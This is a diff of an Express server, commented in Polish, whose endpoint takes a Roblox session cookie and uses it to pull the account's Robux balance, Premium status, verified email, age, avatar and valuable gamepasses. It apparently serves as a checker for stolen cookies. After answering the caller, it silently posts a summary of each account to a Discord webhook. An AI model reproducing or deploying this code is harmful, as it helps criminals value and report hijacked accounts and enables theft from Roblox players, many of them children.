@@ -3,7 +3,7 @@ const app = express();
 
 app.use(express.json());
 
-// Obsługa CORS (żeby frontend z GitHub Pages mógł wysyłać zapytania)
+// CORS żeby frontend mógł wysyłać requesty
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -14,15 +14,15 @@ app.use((req, res, next) => {
   next();
 });
 
-app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmienić na /api/get-username jeśli chcesz)
+app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
-  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
-    return res.status(400).json({ error: 'Missing or invalid cookie' });
+  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
+    return res.status(400).json({ error: 'Złe lub za krótkie cookie' });
   }
 
   try {
-    // Twój oryginalny kod – bez zmian
+    // CSRF token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -31,8 +31,9 @@ app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmien
       },
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');
+    if (!csrfToken) throw new Error('Nie udało się pobrać CSRF token – cookie padło?');
 
+    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       method: 'GET',
       headers: {
@@ -42,10 +43,11 @@ app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmien
       },
     });
     if (!userRes.ok) {
-      throw new Error(userRes.status === 401 ? 'Invalid or expired cookie' : `API error: ${userRes.status}`);
+      throw new Error(userRes.status === 401 ? 'Cookie wygasło lub jest błędne' : `Błąd API: ${userRes.status}`);
     }
     const userData = await userRes.json();
 
+    // Verified email (hat 102611803)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(
@@ -65,6 +67,7 @@ app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmien
       }
     } catch {}
 
+    // Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -73,6 +76,7 @@ app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmien
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
+    // Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -84,19 +88,21 @@ app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmien
       }
     } catch {}
 
+    // Wiek konta
     let accountAgeDays = 0;
-    let createdDate = null;
+    let created = 'nie udało się pobrać';
     try {
       const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
       if (profileRes.ok) {
         const profile = await profileRes.json();
         if (profile.created) {
-          createdDate = profile.created;
-          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
+          created = profile.created;
+          accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
         }
       }
     } catch {}
 
+    // Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -106,6 +112,7 @@ app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmien
       }
     } catch {}
 
+    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -140,57 +147,54 @@ app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmien
       hasPremium,
       robux,
       accountAgeDays,
-      created: createdDate || 'failed to fetch',
+      created,
       avatarUrl,
       hasGamePasses,
       emailVerified,
     };
 
-    // Najpierw oddajemy wynik do frontendu
-    res.status(200).json(result);
+    res.json(result);
 
-    // Potem wysyłamy do Twojego Discorda (jeśli zmienna istnieje)
-    const webhookUrl = process.env.WEBHOOK;
-    if (webhookUrl) {
+    // ────────────────────────────────────────────────
+    // Wysyłka do Discorda
+    // ────────────────────────────────────────────────
+    const webhook = process.env.WEBHOOK;
+    if (webhook) {
       try {
-        await fetch(webhookUrl, {
+        await fetch(webhook, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [{
-              title: `Roblox Checker | ${userData.name} (${userData.id})`,
-              color: hasPremium ? 0x00CC66 : 0x5865F2,
+              title: `Roblox → ${userData.name} (${userData.id})`,
+              color: hasPremium ? 0x00ff9d : 0x5865F2,
               thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
               fields: [
-                { name: "Username", value: userData.name, inline: true },
-                { name: "Display Name", value: userData.displayName || userData.name, inline: true },
-                { name: "User ID", value: userData.id.toString(), inline: true },
-                { name: "Premium", value: hasPremium ? "Yes ✓" : "No ✗", inline: true },
-                { name: "Email Verified", value: emailVerified ? "Yes ✓" : "No ✗", inline: true },
+                { name: "Nick", value: userData.name, inline: true },
+                { name: "Display", value: result.displayName, inline: true },
+                { name: "Premium", value: hasPremium ? "Tak" : "Nie", inline: true },
                 { name: "Robux", value: robux.toLocaleString(), inline: true },
-                { name: "Account Age", value: `${accountAgeDays} days`, inline: true },
-                { name: "Created", value: createdDate || "—", inline: false },
-                { name: "Gamepasses total", value: hasGamePasses.length.toString(), inline: true },
+                { name: "Wiek", value: accountAgeDays + " dni", inline: true },
+                { name: "Email zweryfikowany", value: emailVerified ? "Tak" : "Nie", inline: true },
+                { name: "Gamepasy", value: hasGamePasses.length.toString(), inline: false },
               ],
-              footer: { text: "Sent from Railway • " + new Date().toISOString() },
-              timestamp: new Date().toISOString()
+              timestamp: new Date().toISOString(),
+              footer: { text: "Railway • " + new Date().toLocaleString() }
             }]
           })
         });
-        console.log(`Webhook wysłany dla ${userData.name}`);
-      } catch (webhookErr) {
-        console.error('Błąd webhooka:', webhookErr.message);
+      } catch (e) {
+        console.error("Webhook nie poleciał:", e.message);
       }
     }
 
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: err.message || 'Internal server error' });
+    res.status(500).json({ error: err.message || 'Błąd serwera' });
   }
 });
 
-// Uruchomienie serwera
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Serwer działa na porcie ${PORT}`);
+  console.log(`Działa na porcie ${PORT}`);
 });
